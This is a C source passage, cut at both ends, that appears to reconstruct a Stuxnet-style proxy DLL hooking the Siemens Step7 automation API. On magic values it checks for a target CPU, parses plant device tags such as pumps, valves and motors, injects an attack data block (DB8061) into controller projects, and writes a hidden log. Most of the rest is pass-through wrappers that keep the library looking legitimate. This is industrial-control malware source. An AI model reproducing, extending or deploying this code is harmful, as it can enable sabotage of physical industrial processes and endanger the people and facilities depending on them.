    if (!g_OriginalFunctions.pfnAUTGetObjectList) {
        return FALSE;
    }

    ZeroMemory(szTagBuffer, sizeof(szTagBuffer));
    if (g_OriginalFunctions.pfnAUTGetObjectList(0, (DWORD)szTagBuffer, sizeof(szTagBuffer), 0) != 0) {
        return FALSE;
    }

    g_dwSymbolTagCount = 0;

    for (dwIndex = 0; dwIndex < wcslen(szTagBuffer); dwIndex++) {
        WCHAR ch = szTagBuffer[dwIndex];

        if (ch == L' ' || ch == L'-' || ch == L'_' || ch == L'\0') {
            if (bInTag && dwPos > 0) {
                szCurrentTag[dwPos] = L'\0';
                AddSymbolTag(szCurrentTag);
                dwPos = 0;
                bInTag = FALSE;
            }
            if (ch == L'\0') break;
        } else {
            if (!bInTag) {
                bInTag = TRUE;
                dwPos = 0;
            }
            if (dwPos < 63) {
                szCurrentTag[dwPos++] = ch;
            }
        }
    }

    if (bInTag && dwPos > 0) {
        szCurrentTag[dwPos] = L'\0';
        AddSymbolTag(szCurrentTag);
    }

    g_dwSymbolCount = g_dwSymbolTagCount;
    return (g_dwSymbolTagCount > 0);
}

static BOOL AddSymbolTag(LPCWSTR szTag) {
    PSYMBOL_TAG pTag;
    WCHAR szTemp[64];
    WCHAR *pDelim1, *pDelim2, *pDelim3;
    DWORD dwLen;

    if (!szTag || g_dwSymbolTagCount >= 256) {
        return FALSE;
    }

    pTag = &g_SymbolTags[g_dwSymbolTagCount];
    ZeroMemory(pTag, sizeof(SYMBOL_TAG));

    wcsncpy_s(pTag->szFullTag, 64, szTag, _TRUNCATE);
    wcsncpy_s(szTemp, 64, szTag, _TRUNCATE);

    pDelim1 = wcschr(szTemp, L'-');
    if (!pDelim1) {
        pDelim1 = wcschr(szTemp, L'_');
    }
    if (!pDelim1) {
        pDelim1 = wcschr(szTemp, L' ');
    }

    if (pDelim1) {
        dwLen = (DWORD)(pDelim1 - szTemp);
        if (dwLen > 0 && dwLen < 16) {
            wcsncpy_s(pTag->szFunctionId, 16, szTemp, dwLen);
            wcsncpy_s(pTag->szDelimiter, 4, pDelim1, 1);
        }

        pDelim2 = wcschr(pDelim1 + 1, L'-');
        if (!pDelim2) {
            pDelim2 = wcschr(pDelim1 + 1, L'_');
        }
        if (!pDelim2) {
            pDelim2 = wcschr(pDelim1 + 1, L' ');
        }

        if (pDelim2) {
            dwLen = (DWORD)(pDelim2 - pDelim1 - 1);
            if (dwLen > 0 && dwLen < 8) {
                wcsncpy_s(pTag->szCascadeModule, 8, pDelim1 + 1, dwLen);
            }

            pDelim3 = wcschr(pDelim2 + 1, L'-');
            if (!pDelim3) {
                pDelim3 = wcschr(pDelim2 + 1, L'_');
            }
            if (!pDelim3) {
                pDelim3 = wcschr(pDelim2 + 1, L' ');
            }

            if (pDelim3) {
                pTag->dwCascadeNumber = _wtoi(pDelim2 + 1);
                pTag->dwDeviceNumber = _wtoi(pDelim3 + 1);
            } else {
                pTag->dwCascadeNumber = _wtoi(pDelim2 + 1);
                pTag->dwDeviceNumber = 0;
            }
        } else {
            pTag->dwCascadeNumber = _wtoi(pDelim1 + 1);
            pTag->dwDeviceNumber = 0;
        }
    } else {
        wcsncpy_s(pTag->szFunctionId, 16, szTemp, _TRUNCATE);
        pTag->dwCascadeNumber = 0;
        pTag->dwDeviceNumber = 0;
    }

    pTag->dwDeviceAddress = ResolveDeviceAddress(pTag);
    g_dwSymbolTagCount++;

    return TRUE;
}

static DWORD ResolveDeviceAddress(PSYMBOL_TAG pTag) {
    DWORD dwAddress = 0;
    DWORD dwBase = 0;

    if (!pTag) return 0;

    if (wcscmp(pTag->szFunctionId, L"PIA") == 0 ||
        wcscmp(pTag->szFunctionId, L"PIC") == 0 ||
        wcscmp(pTag->szFunctionId, L"PI") == 0) {
        dwBase = 0x100;
    } else if (wcscmp(pTag->szFunctionId, L"TIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"TIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"TI") == 0) {
        dwBase = 0x200;
    } else if (wcscmp(pTag->szFunctionId, L"LIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"LIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"LI") == 0) {
        dwBase = 0x300;
    } else if (wcscmp(pTag->szFunctionId, L"FIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"FIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"FI") == 0) {
        dwBase = 0x400;
    } else if (wcscmp(pTag->szFunctionId, L"VIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"VIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"VI") == 0) {
        dwBase = 0x500;
    } else if (wcscmp(pTag->szFunctionId, L"QIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"QIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"QI") == 0) {
        dwBase = 0x600;
    } else if (wcscmp(pTag->szFunctionId, L"SIA") == 0 ||
               wcscmp(pTag->szFunctionId, L"SIC") == 0 ||
               wcscmp(pTag->szFunctionId, L"SI") == 0) {
        dwBase = 0x700;
    } else if (wcscmp(pTag->szFunctionId, L"P") == 0 ||
               wcscmp(pTag->szFunctionId, L"Pump") == 0) {
        dwBase = 0x800;
    } else if (wcscmp(pTag->szFunctionId, L"V") == 0 ||
               wcscmp(pTag->szFunctionId, L"Valve") == 0) {
        dwBase = 0x900;
    } else if (wcscmp(pTag->szFunctionId, L"M") == 0 ||
               wcscmp(pTag->szFunctionId, L"Motor") == 0) {
        dwBase = 0xA00;
    } else if (wcscmp(pTag->szFunctionId, L"H") == 0 ||
               wcscmp(pTag->szFunctionId, L"Heater") == 0) {
        dwBase = 0xB00;
    } else {
        dwBase = 0x000;
    }

    dwAddress = dwBase + (pTag->dwCascadeNumber * 16) + pTag->dwDeviceNumber;

    return dwAddress;
}

static BOOL CreateDB8061(VOID) {
    PDB8061_DATA pData;
    DWORD dwDataSize;
    DWORD dwIndex;

    if (!g_OriginalFunctions.pfnAUTPutObject) {
        return FALSE;
    }

    ZeroMemory(&g_DB8061Data, sizeof(DB8061_DATA));

    pData = &g_DB8061Data;
    pData->dwMagic = STUXNET_MAGIC;
    pData->dwVersion = STUXNET_VERSION;
    pData->dwFlags = 0x00000001;
    pData->dwTargetCPUType = g_dwCPUType;
    pData->dwSymbolCount = g_dwSymbolTagCount;
    pData->dwAttackCount = g_dwAttackCount;

    dwDataSize = sizeof(DB8061_DATA);
    dwDataSize = min(dwDataSize, S7AAAPIX_MAX_DB_SIZE);

    if (g_OriginalFunctions.pfnAUTPutObject(S7AAAPIX_DB8061_NUMBER, (DWORD)&g_DB8061Data, dwDataSize, 0) != 0) {
        return FALSE;
    }

    g_dwDB8061Created++;
    return TRUE;
}

static VOID LogEvent(LPCWSTR szEvent) {
    TCHAR szLogPath[MAX_PATH];
    HANDLE hFile;
    DWORD dwWritten;
    SYSTEMTIME st;
    TCHAR szBuffer[1024];

    if (!szEvent) return;

    GetSystemDirectory(szLogPath, MAX_PATH);
    wcscat_s(szLogPath, MAX_PATH, _T("\\stuxnet_aut.log"));

    hFile = CreateFile(szLogPath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                       OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    GetLocalTime(&st);
    wsprintf(szBuffer, _T("[%04d-%02d-%02d %02d:%02d:%02d] %s\r\n"),
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, szEvent);

    SetFilePointer(hFile, 0, NULL, FILE_END);
    WriteFile(hFile, szBuffer, wcslen(szBuffer) * sizeof(TCHAR), &dwWritten, NULL);
    CloseHandle(hFile);
}

static VOID LogError(LPCWSTR szError) {
    TCHAR szBuffer[1024];
    wsprintf(szBuffer, _T("ERROR: %s"), szError);
    LogEvent(szBuffer);
}

DWORD WINAPI AUTDoVerb(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    DWORD dwResult;
    TCHAR szDbgMsg[256];

    if (!g_OriginalFunctions.pfnAUTDoVerb) {
        return 0xFFFFFFFF;
    }

    EnterCriticalSection(&g_csLock);

    if (a2 == S7AAAPIX_MAGIC_DB8061 ||
        a2 == S7AAAPIX_MAGIC_DB8061_2 ||
        a2 == S7AAAPIX_MAGIC_DB8061_3) {

        wsprintf(szDbgMsg, _T("[S7AAAPIX] AUTDoVerb: Magic value detected (0x%08X)\n"), a2);
        OutputDebugString(szDbgMsg);
        LogEvent(L"AUTDoVerb: Magic value detected");

        if (IsTargetSystem()) {
            wsprintf(szDbgMsg, _T("[S7AAAPIX] AUTDoVerb: Target system verified (CPU: 0x%08X)\n"), g_dwCPUType);
            OutputDebugString(szDbgMsg);

            ParseSymbolTags();

            if (CreateDB8061()) {
                wsprintf(szDbgMsg, _T("[S7AAAPIX] AUTDoVerb: DB8061 created successfully\n"));
                OutputDebugString(szDbgMsg);
                LogEvent(L"AUTDoVerb: DB8061 created successfully");
                g_dwAttackCount++;
            } else {
                wsprintf(szDbgMsg, _T("[S7AAAPIX] AUTDoVerb: Failed to create DB8061\n"));
                OutputDebugString(szDbgMsg);
                LogError(L"AUTDoVerb: Failed to create DB8061");
            }
        } else {
            wsprintf(szDbgMsg, _T("[S7AAAPIX] AUTDoVerb: Not a target system (CPU: 0x%08X)\n"), g_dwCPUType);
            OutputDebugString(szDbgMsg);
        }

        LeaveCriticalSection(&g_csLock);
        return 0;
    }

    dwResult = g_OriginalFunctions.pfnAUTDoVerb(a1, a2, a3, a4);
    LeaveCriticalSection(&g_csLock);

    return dwResult;
}

DWORD WINAPI AUTOpenObjectSet(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTOpenObjectSet) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTOpenObjectSet(a1, a2, a3);
}

DWORD WINAPI AUTCloseObjectSet(DWORD a1) {
    if (!g_OriginalFunctions.pfnAUTCloseObjectSet) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTCloseObjectSet(a1);
}

DWORD WINAPI AUTGetObject(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObject(a1, a2, a3, a4);
}

DWORD WINAPI AUTPutObject(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTPutObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTPutObject(a1, a2, a3, a4);
}

DWORD WINAPI AUTDeleteObject(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTDeleteObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTDeleteObject(a1, a2, a3);
}

DWORD WINAPI AUTFindFirst(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTFindFirst) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTFindFirst(a1, a2, a3, a4);
}

DWORD WINAPI AUTFindNext(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTFindNext) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTFindNext(a1, a2, a3);
}

DWORD WINAPI AUTGetInfo(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTGetInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetInfo(a1, a2, a3);
}

DWORD WINAPI AUTSetInfo(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTSetInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetInfo(a1, a2, a3);
}

DWORD WINAPI AUTGetData(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetData) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetData(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetData(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetData) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetData(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetVersion(DWORD a1, DWORD a2) {
    if (!g_OriginalFunctions.pfnAUTGetVersion) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetVersion(a1, a2);
}

DWORD WINAPI AUTInitialize(DWORD a1, DWORD a2) {
    if (!g_OriginalFunctions.pfnAUTInitialize) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTInitialize(a1, a2);
}

DWORD WINAPI AUTDeinitialize(DWORD a1) {
    if (!g_OriginalFunctions.pfnAUTDeinitialize) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTDeinitialize(a1);
}

DWORD WINAPI AUTGetLastError(DWORD a1) {
    if (!g_OriginalFunctions.pfnAUTGetLastError) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetLastError(a1);
}

DWORD WINAPI AUTSetLastError(DWORD a1, DWORD a2) {
    if (!g_OriginalFunctions.pfnAUTSetLastError) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetLastError(a1, a2);
}

DWORD WINAPI AUTGetObjectSetInfo(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTGetObjectSetInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectSetInfo(a1, a2, a3);
}

DWORD WINAPI AUTSetObjectSetInfo(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTSetObjectSetInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectSetInfo(a1, a2, a3);
}

DWORD WINAPI AUTGetObjectInfo(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectInfo(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectInfo(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectInfo) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectInfo(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectData(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTGetObjectData) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectData(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTSetObjectData(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTSetObjectData) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectData(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTDeleteObjectData(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTDeleteObjectData) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTDeleteObjectData(a1, a2, a3);
}

DWORD WINAPI AUTGetObjectList(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectList) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectList(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectSetList(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTGetObjectSetList) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectSetList(a1, a2, a3);
}

DWORD WINAPI AUTGetObjectType(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTGetObjectType) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectType(a1, a2, a3);
}

DWORD WINAPI AUTSetObjectType(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTSetObjectType) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectType(a1, a2, a3);
}

DWORD WINAPI AUTGetObjectName(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectName) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectName(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectName(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectName) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectName(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectPath(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectPath) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectPath(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectPath(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectPath) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectPath(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectParent(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTGetObjectParent) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectParent(a1, a2, a3);
}

DWORD WINAPI AUTSetObjectParent(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTSetObjectParent) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectParent(a1, a2, a3);
}

DWORD WINAPI AUTGetObjectChildren(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectChildren) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectChildren(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectAttributes(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectAttributes) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectAttributes(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectAttributes(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectAttributes) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectAttributes(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectPermissions(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectPermissions) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectPermissions(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectPermissions(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectPermissions) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectPermissions(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectOwner(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectOwner) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectOwner(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectOwner(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectOwner) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectOwner(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectGroup(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectGroup) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectGroup(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectGroup(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectGroup) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectGroup(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectACL(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectACL) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectACL(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectACL(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectACL) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectACL(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectSID(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectSID) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectSID(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectSID(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectSID) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectSID(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectGUID(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectGUID) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectGUID(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectGUID(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectGUID) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectGUID(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectCreationTime(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectCreationTime) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectCreationTime(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectModificationTime(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectModificationTime) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectModificationTime(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectAccessTime(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectAccessTime) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectAccessTime(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectSize(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectSize) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectSize(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectChecksum(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectChecksum) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectChecksum(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectChecksum(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectChecksum) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectChecksum(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectVersion(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectVersion) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectVersion(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectVersion(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectVersion) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectVersion(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectState(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectState) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectState(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectState(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectState) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectState(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectStatus(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectStatus) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectStatus(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectStatus(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectStatus) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectStatus(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectError(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectError) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectError(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectError(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectError) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectError(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectWarning(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectWarning) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectWarning(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectWarning(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectWarning) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectWarning(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectInfoEx(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTGetObjectInfoEx) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectInfoEx(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTSetObjectInfoEx(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTSetObjectInfoEx) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectInfoEx(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTGetObjectDataEx(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5, DWORD a6) {
    if (!g_OriginalFunctions.pfnAUTGetObjectDataEx) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectDataEx(a1, a2, a3, a4, a5, a6);
}

DWORD WINAPI AUTSetObjectDataEx(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5, DWORD a6) {
    if (!g_OriginalFunctions.pfnAUTSetObjectDataEx) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectDataEx(a1, a2, a3, a4, a5, a6);
}

DWORD WINAPI AUTDeleteObjectEx(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTDeleteObjectEx) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTDeleteObjectEx(a1, a2, a3, a4);
}

DWORD WINAPI AUTCopyObject(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTCopyObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTCopyObject(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTMoveObject(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTMoveObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTMoveObject(a1, a2, a3, a4, a5);
}

DWORD WINAPI AUTRenameObject(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTRenameObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTRenameObject(a1, a2, a3, a4);
}

DWORD WINAPI AUTLockObject(DWORD a1, DWORD a2, DWORD a3) {
    if (!g_OriginalFunctions.pfnAUTLockObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTLockObject(a1, a2, a3);
}

DWORD WINAPI AUTUnlockObject(DWORD a1, DWORD a2, DWORD a3) {
